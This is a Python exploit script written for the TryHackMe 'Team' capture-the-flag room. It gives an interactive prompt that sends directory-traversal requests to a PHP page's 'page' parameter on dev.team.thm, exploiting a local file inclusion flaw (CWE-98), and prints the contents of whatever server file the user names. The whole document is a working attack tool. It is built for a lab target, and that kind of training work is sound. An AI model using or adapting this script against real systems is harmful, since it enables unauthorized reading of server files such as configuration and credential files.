#!/usr/bin/env python3

"""
Script for 'Team' challenge - TryHackMe
CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
Autor: Pedro Parmentier (HellHound)
"""

import requests as req
from sys import exit
from urllib3 import disable_warnings
from termcolor import colored

from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import InMemoryHistory


# No insecure HTTP warnings
disable_warnings()


def start_req(lfi):

    try:
        res = req.get(f'http://dev.team.thm/script.php?page=../../../../../../{lfi}', verify=False, timeout=3)
        #res = req.get(f'http://dev.team.thm/script.php?page={lfi}', verify=False, timeout=3)

        if res.status_code == 200:
            return res.text.strip()
    except (req.exceptions.ConnectionError, req.exceptions.ReadTimeout) as e:
        print(colored(f" [x] Error {e}", 'red'))
        exit(1)


def main():

    try:
        session = PromptSession(history=InMemoryHistory())

        while True:
            shell = session.prompt(
                    HTML('<green> > </green>'),
                    auto_suggest=AutoSuggestFromHistory()
            ).strip()

            if shell.startswith('/'):
                shell = shell.lstrip('/')

            shell = "/".join(s for s in shell.split(' '))

            lfi = start_req(shell)
            print(lfi)


    except KeyboardInterrupt:
        print(colored("\n [i] Saliendo...", 'light_cyan'))
        exit()



if __name__ == '__main__':
    main()
